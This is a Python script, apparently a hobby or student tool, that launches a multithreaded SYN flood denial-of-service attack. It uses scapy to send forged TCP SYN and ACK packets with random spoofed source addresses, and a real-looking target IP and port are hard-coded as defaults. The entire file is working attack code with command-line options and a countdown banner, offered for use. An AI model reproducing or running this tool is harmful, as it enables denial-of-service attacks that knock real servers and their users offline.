# -*- coding: utf-8 -*-
"""
Created on Tue May 15 11:49:33 2018
@author: DrLC
"""

import random
import socket
import sys
import threading
import time
import scapy.all as sca

THREAD_DEFAULT = 300
TARGET_DEFAULT = "47.106.157.25"
PORT_DEFAULT = 8000


def print_help():
    print()
    print("+--------------------------+")
    print("|                          |")
    print("|      SYN Flood           |")
    print("|                          |")
    print("|       by TakingOffPKU    |")
    print("|                          |")
    print("+--------------------------+")
    print()
    print("DDoS the target server process with toy-like SYN flood.")
    print()
    print("Use the following command to start attacking.")
    print("  python3 %s" % (sys.argv[0]))
    print("Optional arguments are:")
    print("  -H or --host\tIP address of the server.")
    print("  -P or --port\tPort of the server.")
    print("  -T or --thread\tMultithread.")
    print("  -V or --verbose\tVerbose mode")
    print("Example:")
    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD -V IF_VERBOSE"
          % (sys.argv[0]))
    print()


def getopt(ARGS):
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"host": TARGET_DEFAULT,
           "port": PORT_DEFAULT,
           "thread": THREAD_DEFAULT,
           "verbose": True}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-H', '--host']:
                ret['host'] = str(ARGS[i + 1])
            elif ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-T', '--thread']:
                ret['thread'] = int(ARGS[i + 1])
            elif ARGS[i] in ['-V', '--verbose']:
                if ARGS[i + 1] == 'y':
                    ret['verbose'] = True
                else:
                    ret['verbose'] = False
            else:
                try:
                    assert False
                except:
                    print_help()
                    exit(0)
    return ret


class sendSYN(threading.Thread):
    THREAD = 0
    waiting_time = 0.5

    def __init__(self, target, port, verbose=False):
        try:
            self.__target = target
            self.__port = port
            self.__id = sendSYN.THREAD
            self.__verbose = verbose
            dice = random.randint(0, 9)
            if dice == 0:
                self.__type = 0
            else:
                self.__type = 1
            sendSYN.THREAD += 1
            threading.Thread.__init__(self)
        except KeyboardInterrupt:
            if self.__verbose:
                print("\nSYN flood attack ends!")
            exit(0)

    def __del__(self):
        try:
            sendSYN.THREAD -= 1
        except KeyboardInterrupt:
            if self.__verbose:
                print("\nSYN flood attack ends!")
            exit(0)

    def run(self):
        try:
            if self.__type == 1:
                i = sca.IP()
                t = sca.TCP()
                ip_list = [random.randint(1, 254) for i in range(0, 4)]
                port_rand = random.randint(2048, 65535)
                if self.__verbose:
                    print ("\r%d threads running" % sendSYN.THREAD, end="")
                i.src = ("%i.%i.%i.%i" % (ip_list[0], ip_list[1], ip_list[2], ip_list[3]))
                i.dst = self.__target
                t.sport = port_rand
                t.dport = self.__port
                t.flags = 'S'
                sca.send(i / t, verbose=0)
                i = sca.IP()
                t = sca.TCP()
                time.sleep(sendSYN.waiting_time)
                #ip_list = [random.randint(1, 254) for i in range(4)]
                if self.__verbose:
                    print ("\r%d threads running" % sendSYN.THREAD, end="")
                i.src = ("%i.%i.%i.%i" % (ip_list[0], ip_list[1], ip_list[2], ip_list[3]))
                i.dst = self.__target
                t.sport = port_rand
                t.dport = self.__port
                t.flags = 'A'
                sca.send(i / t, verbose=0)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                start = time.time()
                sock.connect((self.__target, self.__port))
                end = time.time()
                sendSYN.waiting_time = sendSYN.waiting_time*0.97 + 0.01 *(end-start)
                sock.close()
            return
        except  KeyboardInterrupt:
            if self.__verbose:
                print("\nSYN flood attack ends!")
            exit(0)


if __name__ == "__main__":

    args = getopt(sys.argv)
    if args['verbose'] == True:
        print()
        print("+--------------------------+")
        print("|                          |")
        print("|      SYN Flood           |")
        print("|                          |")
        print("|       by TakingOffPKU    |")
        print("|                          |")
        print("+--------------------------+")
        print()
        print("Host: %s" % args["host"])
        print("Port: %d" % args["port"])
        print("Thread: %d" % args["thread"])
        print()
        print("SYN flood attack will begin in")
    countdown = 5
    for i in range(countdown, 0, -1):
        if args['verbose'] == True:
            string = '\r'
            for j in range(countdown, i - 1, -1):
                string += str(j) + "..."
            print(string, end="")
        time.sleep(1)
    if args['verbose'] == True:
        print("\nSYN flood attack begins!")

    while True:
        try:
            if sendSYN.THREAD <= args['thread']:
                tmp = sendSYN(args['host'], args['port'], args['verbose'])
                tmp.start()
        except KeyboardInterrupt:
            print("\nSYN flood attack ends!")
            exit(0)
